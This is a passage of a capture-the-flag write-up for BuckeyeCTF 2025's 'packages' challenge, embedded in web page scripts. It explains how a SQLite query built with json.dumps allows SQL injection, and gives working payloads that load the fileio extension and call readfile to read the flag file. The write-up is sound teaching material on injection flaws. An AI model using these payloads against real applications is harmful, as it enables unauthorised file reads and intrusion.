db.execute(sql).fetchall()\n\n    return render_template_string(TEMPLATE, request=request, results=results)\n\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", port=8000)"])</script><script>self.__next_f.push([1,"5:[\"$\",\"div\",null,{\"children\":[\"$\",\"main\",null,{\"className\":\"text-pretty max-w-5xl mx-auto text-sm [\u0026_h1]:text-5xl [\u0026_h1]:font-semibold [\u0026_h1]:mb-8 [\u0026_blockquote]:text-secondary [\u0026_blockquote]:space-y-3 [\u0026_blockquote]:border-l-4 [\u0026_blockquote]:border-secondary [\u0026_blockquote]:pl-5 [\u0026_blockquote]:mb-5 [\u0026\u003e_p]:my-4 [\u0026_img]:my-5 [\u0026_ul]:list-disc [\u0026_ul]:pl-6 [\u0026_ol]:list-decimal [\u0026_ol]:pl-6 [\u0026_img]:rounded [\u0026_li]:my-2\",\"children\":[[\"$\",\"h1\",\"h1-0\",{\"children\":\"BuckeyeCTF 2025 — packages\"}],\"\\n\",[\"$\",\"blockquote\",\"blockquote-0\",{\"children\":[\"\\n\",[\"$\",\"p\",\"p-0\",{\"children\":\"Explore the world of debian/debian-based packages.\"}],\"\\n\",[\"$\",\"p\",\"p-1\",{\"children\":[\"$\",\"a\",\"a-0\",{\"href\":\"https://packages.challs.pwnoh.io\",\"children\":\"https://packages.challs.pwnoh.io\"}]}],\"\\n\"]}],\"\\n\",[\"$\",\"p\",\"p-0\",{\"children\":\"We're given a Python server that looks like this:\"}],\"\\n\",[\"$\",\"$Le\",\"pre-0\",{\"className\":\"my-2\",\"children\":\"$f\",\"language\":\"py\"}],\"\\n\",\"$L10\",\"\\n\",\"$L11\",\"\\n\",\"$L12\",\"\\n\",\"$L13\",\"\\n\",\"$L14\",\"\\n\",\"$L15\",\"\\n\",\"$L16\",\"\\n\",\"$L17\",\"\\n\",\"$L18\",\"\\n\",\"$L19\",\"\\n\",\"$L1a\",\"\\n\",\"$L1b\",\"\\n\",\"$L1c\",\"\\n\",\"$L1d\",\"\\n\",\"$L1e\",\"\\n\",\"$L1f\",\"\\n\",\"$L20\",\"\\n\",\"$L21\",\"\\n\",\"$L22\",\"\\n\",\"$L23\"]}]}]\n"])</script><script>self.__next_f.push([1,":HL[\"https://gist.github.com/user-attachments/assets/2608bd98-1ec8-43f4-8a5a-bbe3e6cfd080\",\"image\"]\n10:[\"$\",\"p\",\"p-1\",{\"children\":[\"We can see that even though \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"json.dumps()\"}],\" surrounds our query in quotes, we can still easily get SQL injection by putting quotes in our query ourselves: a \",[\"$\",\"code\",\"code-1\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"distro\"}],\" of\"]}]\n11:[\"$\",\"$Le\",\"pre-1\",{\"className\":\"my-2\",\"children\":\"\\\"OR 1=1;--\",\"language\":\"sql\"}]\n12:[\"$\",\"p\",\"p-2\",{\"children\":\"results in the following SQL query\"}]\n13:[\"$\",\"$Le\",\"pre-2\",{\"className\":\"my-2\",\"children\":\"SELECT distro, distro_version, package, package_version FROM packages WHERE LOWER(distro) = \\\"\\\\\\\"OR 1=1;--\\\"\",\"language\":\"sql\"}]\n14:[\"$\",\"p\",\"p-3\",{\"children\":[\"and even though \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"json.dumps()\"}],\" escapes our inner quote with a backslash, \",[\"$\",\"a\",\"a-0\",{\"href\":\"https://www.sqlite.org/lang_expr.html#literal_values_constants_\",\"children\":\"backslash escapes are not supported in SQLite\"}],\" and the \",[\"$\",\"code\",\"code-1\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"\\\\\"}],\" is treated as a plain character.\"]}]\n15:[\"$\",\"p\",\"p-4\",{\"children\":\"Another thing to notice is\"}]\n16:[\"$\",\"$Le\",\"pre-3\",{\"className\":\"my-2\",\"children\":\"db.enable_load_extension(True)\",\"language\":\"py\"}]\n17:[\"$\",\"p\",\"p-5\",{\"children\":[\"which \",[\"$\",\"a\",\"a-0\",{\"href\":\"https://docs.python.org/3/library/sqlite3.html#sqlite3.Connection.enable_load_extension\",\"children\":[\"enables the SQLite \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"load_extension()\"}],\" function\"]}],\" for loading \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\".so\"}],\" extension files.\"]}]\n18:[\"$\",\"p\",\"p-6\",{\"children\":\"Looking at the Dockerfile,\"}]\n19:[\"$\",\"$Le\",\"pre-4\",{\"className\":\"my-2\",\"children\":\"FROM ghcr.io/astral-sh/uv:debian\\n\\nRUN wget https://sqlite.org/src/tarball/sqlite.tar.gz?r=release -O sqlite.tar.gz\\nRUN tar xf sqlite.tar.gz\\nWORKDIR /sqlite\\nRUN ./configure\\nRUN make -j$(nproc)\\nWORKDIR /sqlite/ext/misc\\nRUN for f in *; do gcc -g -fPIC -shared $f -o \\\"${f%.c}.so\\\"; done\\n\\nADD main.py pyproject.toml uv.lock seed.sql flag.txt /app/\\nWORKDIR /app/\\nRUN /sqlite/sqlite3 packages.db \u003c seed.sql\\nRUN uv sync --locked\\nUSER 1000\\nENV PYTHONUNBUFFERED=1\\nCMD .venv/bin/python3 main.py\",\"language\":\"dockerfile\"}]\n1a:[\"$\",\"p\",\"p-7\",{\"children\":[\"they've conveniently compiled all extensions in \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"sqlite/ext/misc\"}],\" to \",[\"$\",\"code\",\"code-1\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\".so\"}],\" files, and we can load them at will with\"]}]\n1b:[\"$\",\"$Le\",\"pre-5\",{\"className\":\"my-2\",\"children\":\"SELECT load_extension('/sqlite/ext/misc/{...}.so');\",\"language\":\"sql\"}]\n1c:[\"$\",\"p\",\"p-8\",{\"children\":[\"So which of \",[\"$\",\"a\",\"a-0\",{\"href\":\"https://github.com/sqlite/sqlite/tree/master/ext/misc\",\"children\":\"these extensions\"}],\" seem helpful? Conveniently, \",[\"$\",\"a\",\"a-1\",{\"href\":\"https://github.com/sqlite/sqlite/blob/master/ext/misc/fileio.c\",\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"fileio\"}]}],\" defines \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"readfile()\"}],\" and \",[\"$\",\"code\",\"code-1\",{\"className\":\"font-jetbrains opacity-75 bg-bl"])</script><script>self.__next_f.push([1,"ack/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"writefile()\"}],\" functions for SQL:\"]}]\n1d:[\"$\",\"$Le\",\"pre-6\",{\"className\":\"my-2\",\"children\":\"/*\\n** 2014-06-13\\n**\\n** The author disclaims copyright to this source code.  In place of\\n** a legal notice, here is a blessing:\\n**\\n**    May you do good and not evil.\\n**    May you find forgiveness for yourself and forgive others.\\n**    May you share freely, never taking more than you give.\\n**\\n******************************************************************************\\n**\\n** This SQLite extension implements SQL functions readfile() and\\n** writefile(), and eponymous virtual type \\\"fsdir\\\".\\n**\\n** ...\\n**\\n** READFILE(FILE):\\n**\\n**   Read and return the contents of file FILE (type blob) from disk.\\n**\\n** ...\\n*/\",\"language\":\"c\"}]\n1e:[\"$\",\"p\",\"p-9\",{\"children\":\"Thus, we can simply query\"}]\n1f:[\"$\",\"$Le\",\"pre-7\",{\"className\":\"my-2\",\"children\":\"\\\"OR 1=1 UNION SELECT load_extension('/sqlite/ext/misc/fileio.so'), 1, 1, 1;--\",\"language\":\"sql\"}]\n20:[\"$\",\"p\",\"p-10\",{\"children\":[\"to load the \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"fileio\"}],\" extension (we need \",[\"$\",\"code\",\"code-1\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"UNION SELECT\"}],\" since we are tacking this onto the end of an existing query, and \",[\"$\",\"code\",\"code-2\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"UNION SELECT\"}],\" requires both sides of the query to have the same number of columns), and\"]}]\n21:[\"$\",\"$Le\",\"pre-8\",{\"className\":\"my-2\",\"children\":\"\\\"OR 1=1 UNION SELECT readfile('/app/flag.txt'), 1, 1, 1 from packages;--\",\"language\":\"sql\"}]\n22:[\"$\",\"p\",\"p-11\",{\"children\":\"to read the flag:\"}]\n23:[\"$\",\"p\",\"p-12\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/2608bd98-1ec8-43f4-8a5a-bbe3e6cfd080\",\"alt\":\"img\"}]}]\n"])</script><script>self.__next_f.push([1,"c:[[\"$\",\"title\",\"0\",{\"children\":\"BuckeyeCTF 2025 — packages | kevin.fish\"}],[\"$\",\"meta\",\"1\",{\"name\":\"description\",\"content\":\"Explore the world of debian/debian-based packages.\"}],[\"$\",\"meta\",\"2\",{\"property\":\"og:title\",\"content\":\"BuckeyeCTF 2025 — packages\"}],[\"$\",\"meta\",\"3\",{\"property\":\"og:description\",\"content\":\"Explore the world of debian/debian-based packages.\"}],[\"$\",\"meta\",\"4\",{\"name\":\"twitter:card\",\"content\":\"summary\"}],[\"$\",\"meta\",\"5\",{\"name\":\"twitter:title\",\"content\":\"BuckeyeCTF 2025 — packages\"}],[\"$\",\"meta\",\"6\",{\"name\":\"twitter:description\",\"content\":\"Explore the world of debian/debian-based packages.\"}]]\n8:null\n"])</script></body></html>